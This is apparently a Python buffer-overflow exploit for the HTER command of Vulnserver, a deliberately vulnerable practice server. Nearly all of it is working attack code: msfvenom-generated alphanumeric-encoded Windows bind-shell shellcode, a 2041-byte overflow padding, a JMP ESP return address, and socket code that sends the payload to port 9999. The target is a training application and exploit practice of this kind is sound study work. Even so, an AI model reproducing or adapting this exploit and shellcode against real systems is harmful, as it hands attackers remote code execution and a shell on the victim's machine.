# Exploit for Vulnserver HTER
# Author: Prashant Kumar (@notsoshant)

import socket

host = '127.0.0.1'
port = 9999

# msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed BufferRegister=ESP
shellcode =  ""
shellcode += "545949494949494949494949"
shellcode += "49494949494937515a6a4158"
shellcode += "50304130416b414151324142"
shellcode += "324242304242414258503841"
shellcode += "42754a494b4c59784f723330"
shellcode += "3330377061704c494d354561"
shellcode += "595030644c4b527050304e6b"
shellcode += "6142644c6e6b305232344e6b"
shellcode += "71627578566f4d67637a4466"
shellcode += "7651796f6c6c656c6531716c"
shellcode += "3772664c557039517a6f466d"
shellcode += "77714a676b524c3261423057"
shellcode += "4e6b727262304c4b326a656c"
shellcode += "4e6b326c567150786d335158"
shellcode += "67715a7163614c4b71496130"
shellcode += "733148536e6b626977684863"
shellcode += "574a50496c4b67446c4b6771"
shellcode += "385670314b4f4e4c69514a6f"
shellcode += "466d3331684774786d305075"
shellcode += "4b464773534d4a58374b434d"
shellcode += "34647345497450584e6b5638"
shellcode += "56447771794331766e6b344c"
shellcode += "504b6c4b7058554c73315853"
shellcode += "6e6b44444c4b555138506f79"
shellcode += "537466447754614b636b7061"
shellcode += "7639736a4361596f6b50514f"
shellcode += "736f314a6e6b45424a4b6c4d"
shellcode += "436d43585033347255504330"
shellcode += "7178616764336472536f6364"
shellcode += "3178626c707746463667496f"
shellcode += "69456f486a30533157703550"
shellcode += "675939545054463055385759"
shellcode += "4f70324b67704b4f7945535a"
shellcode += "5668314932705972796d6370"
shellcode += "3270673052704248797a744f"
shellcode += "794f3970696f39456e774248"
shellcode += "377235504761636c6f796976"
shellcode += "335a72303366527770684952"
shellcode += "494b36573247696f79453057"
shellcode += "33584c7739796658696f6b4f"
shellcode += "4e353637506864344a4c756b"
shellcode += "4b51596f385563676d473248"
shellcode += "5075306e426d5171396f7a75"
shellcode += "42486353424d535433306f79"
shellcode += "386346376277527750316a56"
shellcode += "624a3762527942763862696d"
shellcode += "63564b7751544464556c4331"
shellcode += "65516c4d3264557434506b76"
shellcode += "555032644364663046364276"
shellcode += "336650466636304e72765366"
shellcode += "43637276717834395a6c674f"
shellcode += "4d56396f4b654b394d30726e"
shellcode += "46364376596f365030687338"
shellcode += "4f77576d3530496f78556d6b"
shellcode += "38704d656d72463675383936"
shellcode += "6f656d6d4d4d696f6e35656c"
shellcode += "4446616c444a4d50796b6b50"
shellcode += "525566656f4b637745437072"
shellcode += "706f506a73306363396f4a75"
shellcode += "4141"

# 0x625011AF - JMP ESP
payload = "C"*2041 + "AF115062" + shellcode

print("Payload length: " + str(len(payload)))
buffer = "HTER " + payload
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
